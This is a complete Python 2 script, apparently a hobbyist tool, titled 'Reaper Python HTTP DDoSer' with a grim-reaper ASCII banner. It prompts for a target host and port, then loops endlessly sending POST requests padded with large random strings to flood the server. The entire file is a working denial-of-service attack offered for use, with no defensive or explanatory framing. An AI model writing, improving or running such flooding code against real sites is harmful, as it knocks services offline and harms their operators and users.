import socket, httplib, time, urllib, random
print("\033[92;40mReaper Python HTTP DDoSer\n")
print("             ;::::;")
print("           ;::::; :;")
print("         ;:::::'   :;")
print("        ;:::::;     ;.")
print("       ,:::::'       ;           OOO")
print("       ::::::;       ;          OOOOO")
print("       ;:::::;       ;         OOOOOOOO")
print("      ,;::::::;     ;'       /  / OOOOOOO")
print("    ;:::::::::. ,,,;.       /  / DOOOOOO")
print("  .';:::::::::::::::::;,   /  /     DOOOO")
print(" ,::::::;::::::;;;;::::;, /  /        DOOO")
print(";::::::'::::::;;;::::: ,#/  /          DOOO")
print("::::::::;::::::;;::: ;::#  /            DOOO")
print(":::::::::;:::::::: ;::::# /              DOO")
print("::::::::;:::::: ;::::::#/               DOO")
print(" ::::::::::;; ;:::::::::##                OO")
print(" :::::::::::;::::::::;:::#                OO")
print(" :::::::::::::::::;':;::#                O")
print("  :::::::::::::;' /  / :#")
print("Coded by KrisIsHere")
headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
u=raw_input('TARGET:\n(www.example.com)\n>')
p=input('port:\n>')
def b(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return(out_str)

i=0
while True:
 try:
  params = urllib.urlencode({'search': b(random.randint(3,10))*1000})
  conn = httplib.HTTPConnection(u, p, timeout=3)
  conn.request("POST", '/', params, headers)
  i+=1
  print 'opening connections:',i
 except socket.error as e:
  print e
